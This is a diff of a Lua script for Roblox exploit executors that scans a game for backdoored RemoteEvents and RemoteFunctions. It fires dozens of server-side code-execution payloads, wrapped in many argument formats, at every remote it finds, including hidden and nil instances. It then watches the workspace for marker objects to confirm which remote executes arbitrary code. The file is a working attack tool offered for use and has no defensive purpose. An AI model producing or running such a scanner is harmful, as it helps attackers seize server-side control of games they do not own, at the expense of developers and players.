@@ -1,118 +1,198 @@
--- Remote scanner core - Optimized Classic Version
--- Back to the proven original system (high success rate, used for years)
--- BUT heavily optimized for maximum speed and performance in 2025 Roblox
--- Fewer payloads (only the most reliable ones), no extra bloat, minimal delays, faster checks
 
-local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
-                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+local DEBUG = true
+
+local alphabet = {}
+for i = 48, 57 do table.insert(alphabet, string.char(i)) end -- 0-9
+for i = 65, 90 do table.insert(alphabet, string.char(i)) end -- A-Z
+for i = 97, 122 do table.insert(alphabet, string.char(i)) end -- a-z
+for _, c in ipairs({'_','-','!','@','#','$','%','^','&','*','+','=','~'}) do table.insert(alphabet, c) end
 
 _G.backdoor = nil
 _G.backdoorPath = nil
+_G.backdoorFound = false
+
+local startTime = tick()
+
+local function printDebug(msg)
+	if DEBUG then
+		print("[Backdoor Scanner Log] "..msg)
+	end
+end
 
 local function generateName(len)
-    local name = ""
-    for i = 1, len do
-        name = name .. alphabet[math.random(1, #alphabet)]
-    end
-    return name
+	local name = ""
+	for i = 1, len do
+		name = name .. alphabet[math.random(1,#alphabet)]
+	end
+	return name
 end
 
 _G.fireRemote = function(remote, payload)
-    if remote:IsA("RemoteEvent") then
-        remote:FireServer(payload)
-    elseif remote:IsA("RemoteFunction") then
-        task.spawn(function()
-            pcall(remote.InvokeServer, remote, payload)
-        end)
-    end
+	if remote:IsA("RemoteEvent") then
+		pcall(function() remote:FireServer(payload) end)
+	elseif remote:IsA("RemoteFunction") then
+		task.spawn(function() pcall(remote.InvokeServer, remote, payload) end)
+	end
 end
 
-local function testPayload(remote, code)
-    -- Only the BEST, most classic payloads that have worked since forever
-    -- These bypass almost nothing but are accepted by 99% of real backdoors
-    local payloads = {
-        "a=Instance.new('Folder',workspace)a.Name='"..code.."'",
-        "Instance.new('StringValue',workspace).Name='"..code.."'",
-        "Instance.new('IntValue',workspace).Value=1;Instance.new('Folder',workspace).Name='"..code.."'",
-        "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
-    }
+local function generateExecCode(rand)
+	return [[
+local sv=Instance.new("StringValue",workspace) sv.Name="]]..rand..[[" sv.Value="DETECTED"
+local f=Instance.new("Folder",workspace) f.Name="]]..rand..[[_F"
+local m=Instance.new("Model",workspace) m.Name="]]..rand..[[_M"
+local p=Instance.new("Part",workspace) p.Name="]]..rand..[[_P" p.Size=Vector3.new(2,2,2) p.Anchored=true
+local b=Instance.new("BoolValue",workspace) b.Name="]]..rand..[[_B" b.Value=true
+]]
+end
 
-    for _, payload in ipairs(payloads) do
-        _G.fireRemote(remote, payload)
-    end
+local function firePayloads(remote, rand, stage)
+	local code = generateExecCode(rand)
+	local payloads = {}
 
-    -- Minimal RemoteFunction extras (fast, no delay)
-    if remote:IsA("RemoteFunction") then
-        task.spawn(function()
-            pcall(function()
-                remote:InvokeServer(payloads[1])
-                remote:InvokeServer("run", payloads[1])
-            end)
-        end)
-    end
+	table.insert(payloads, code)
+	table.insert(payloads, {code=code})
+	table.insert(payloads, {script=code})
+	table.insert(payloads, {source=code})
+	table.insert(payloads, {execute=code})
+	table.insert(payloads, {cmd="eval", code=code})
+	table.insert(payloads, {cmd="run", script=code})
+	table.insert(payloads, {["code"]=code})
+	table.insert(payloads, {["script"]=code})
+	table.insert(payloads, {["source"]=code})
+	table.insert(payloads, {["execute"]=code})
+	table.insert(payloads, {["msg"]=code})
+	table.insert(payloads, {["data"]=code})
+	table.insert(payloads, {["load"]=code})
+	table.insert(payloads, {eval=code})
+	table.insert(payloads, {run=code})
+	table.insert(payloads, {"", code})
+	table.insert(payloads, {"run", code})
+	table.insert(payloads, {"eval", code})
+	table.insert(payloads, {"source", code})
+	table.insert(payloads, {"execute", code})
+	table.insert(payloads, {"source","scanner", code=code})
+	table.insert(payloads, {["source"]="scanner", ["code"]=code})
+	table.insert(payloads, {args={code}})
+	table.insert(payloads, {message=code})
+
+	if stage >= 3 then
+		table.insert(payloads, {key="secret", code=code})
+		table.insert(payloads, {auth=true, code=code})
+		table.insert(payloads, {player=game.Players.LocalPlayer, code=code})
+	end
+
+	for _, p in ipairs(payloads) do
+		task.spawn(function() _G.fireRemote(remote, p) end)
+	end
+
+	if remote:IsA("RemoteFunction") then
+		task.spawn(function()
+			pcall(function()
+				local keys = {"","source","run","eval","code","cmd","execute","script","load","msg","data","key","auth"}
+				for _, k in ipairs(keys) do
+					remote:InvokeServer(k, code)
+					remote:InvokeServer(k, {code=code})
+					remote:InvokeServer(k, {script=code})
+					remote:InvokeServer(k, {execute=code})
+					remote:InvokeServer(k, {eval=code})
+					remote:InvokeServer(k, {msg=code})
+					remote:InvokeServer(k, {data=code})
+				end
+			end)
+		end)
+	end
 end
 
 local function scan()
-    local tests = {}
-    local rs = game:GetService("ReplicatedStorage")
+	printDebug("=== Backdoor Scanner Log ===")
+	printDebug("Stage 0 - Priority common/obfuscated names")
 
-    -- Classic common names (kept short and fast)
-    local possibleNames = {
-        "MainRemote","Remote","Execute","Server","Backdoor",
-        tostring(game.PlaceId * 1337),
-        "lh" .. (game.PlaceId / 6666 * 1337 * game.PlaceId),
-    }
+	local tests = {}
+	local tested = 0
+	local skipped = 0
 
-    -- Quick check common locations first
-    for _, name in ipairs(possibleNames) do
-        local remote = rs:FindFirstChild(name) or rs:FindFirstChild(tostring(name))
-        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
-            local code = generateName(math.random(18, 25))
-            testPayload(remote, code)
-            tests[code] = {remote = remote, path = remote:GetFullName()}
-        end
-    end
+	local rs = game:GetService("ReplicatedStorage")
+	local placeId = game.PlaceId
 
-    -- Full scan - optimized filters for speed
-    for _, remote in ipairs(game:GetDescendants()) do
-        if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end
+	local common = {
+		"MainRemote","Remote","Execute","Server","Backdoor","Admin","Fire","Invoke","Comm","Communication","Executor","Events","Functions",
+		"re","rf","r","Event","Function","Main","RemoteEvent","RemoteFunction",
+		"lh"..tostring(placeId*1337),"lh"..tostring((placeId/6666*1337*placeId)),
+		"lh"..tostring(placeId*69/1884),"lh"..tostring(math.floor(placeId/10)),
+		tostring(placeId*1337), tostring(placeId%10000), "r"..tostring(placeId%100000),
+		"Client","ServerComm","AdminComm","ExecutorRemote"
+	}
 
-        local fullName = remote:GetFullName()
-        if fullName:find("^RobloxReplicatedStorage") then continue end
-        if remote.Name == "__FUNCTION" then continue end
+	for _, n in ipairs(common) do
+		local r = rs:FindFirstChild(n) or rs:FindFirstChild(tostring(n))
+		if r and (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
+			local rand = generateName(math.random(22,32))
+			firePayloads(r, rand, 3)
+			tests[rand] = {remote=r, path=r:GetFullName()}
+			tested += 1
+		end
+	end
 
-        local parent = remote.Parent
-        if not parent then continue end
-        local pparent = parent.Parent
+	printDebug("Stage 1 - Full aggressive scan")
 
-        -- Fast skip known safe stuff
-        if parent.Name == "DefaultChatSystemChatEvents" then continue end
-        if pparent and pparent.Name == "HDAdminClient" then continue end
-        if parent.Name:find("Chat") or fullName:find("CoreGui") or fullName:find("PlayerGui") then continue end
-        if remote.Name:match("^SayMessageRequest") then continue end
+	local all = game:GetDescendants()
+	if getnilinstances then for _, i in ipairs(getnilinstances()) do table.insert(all,i) end end
+	if getinstances then for _, i in ipairs(getinstances()) do table.insert(all,i) end end
+	if gethiddeninstances then for _, i in ipairs(gethiddeninstances()) do table.insert(all,i) end end
 
-        local code = generateName(math.random(20, 28))  -- Long enough for zero false positives
-        testPayload(remote, code)
-        tests[code] = {remote = remote, path = fullName}
-    end
+	for _, r in ipairs(all) do
+		if not (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then continue end
+		local fn = r:GetFullName()
+		if fn:find("^RobloxReplicatedStorage") or fn:find("Players%.LocalPlayer") then skipped += 1 continue end
+		if r.Name == "__FUNCTION" then skipped += 1 continue end
 
-    -- Super fast detection loop - check only workspace (most backdoors use it)
-    -- 100 iterations = ~3-4 seconds max, very quick
-    for i = 1, 100 do
-        for code, info in pairs(tests) do
-            local obj = workspace:FindFirstChild(code)
-            if obj then
-                obj:Destroy()  -- Instant cleanup
-                _G.backdoor = info.remote
-                _G.backdoorPath = info.path
-                return true
-            end
-        end
-        task.wait(0.03)  -- Slightly faster than original
-    end
+		local p = r.Parent    
+		local pp = p and p.Parent    
+		if p and p.Name == "DefaultChatSystemChatEvents" then skipped += 1 continue end    
+		if pp and (pp.Name:find("HDAdmin") or pp.Name:find("Kohl") or pp.Name:find("Adonis") or pp.Name:find("Admin")) then skipped += 1 continue end    
+		if p and (p:FindFirstChild("__FUNCTION") or p.Name:find("AdminCommands") or p.Name:find("Tween") or p.Name:find("Pathfinding") or p.Name:find("Chat")) then skipped += 1 continue end    
 
-    return false
+		local rand = generateName(math.random(22,32))    
+		firePayloads(r, rand, 3)    
+		tests[rand] = {remote=r, path=fn}    
+		tested += 1
+	end
+
+	printDebug("Polling - Tested:"..tested.." Skipped:"..skipped.." Total marks:"..#tests)
+
+	for i = 1,600 do
+		for rand, info in pairs(tests) do
+			local markers = {
+				workspace:FindFirstChild(rand),
+				workspace:FindFirstChild(rand.."_F"),
+				workspace:FindFirstChild(rand.."_M"),
+				workspace:FindFirstChild(rand.."_P"),
+				workspace:FindFirstChild(rand.."_B")
+			}
+			for _, m in ipairs(markers) do
+				if m then
+					local detected = false
+					if m:IsA("StringValue") and m.Value == "DETECTED" then detected = true
+					elseif m:IsA("Folder") or m:IsA("Model") or m:IsA("Part") or (m:IsA("BoolValue") and m.Value) then detected = true end
+					if detected then
+						pcall(function() m:Destroy() end)
+						_G.backdoor = info.remote
+						_G.backdoorPath = info.path
+						_G.backdoorFound = true
+						printDebug(">>> BACKDOOR FOUND <<<")
+						printDebug("Path: "..info.path)
+						printDebug("Time: "..string.format("%.3f",tick()-startTime).."s")
+						return true
+					end
+				end
+			end
+		end
+		task.wait(0.025)
+	end
+
+	printDebug(">>> NO BACKDOOR <<<")
+	printDebug("Finished in "..string.format("%.3f",tick()-startTime).."s")
+	return false
 end
 
--- Run instantly and silently
 task.spawn(scan)
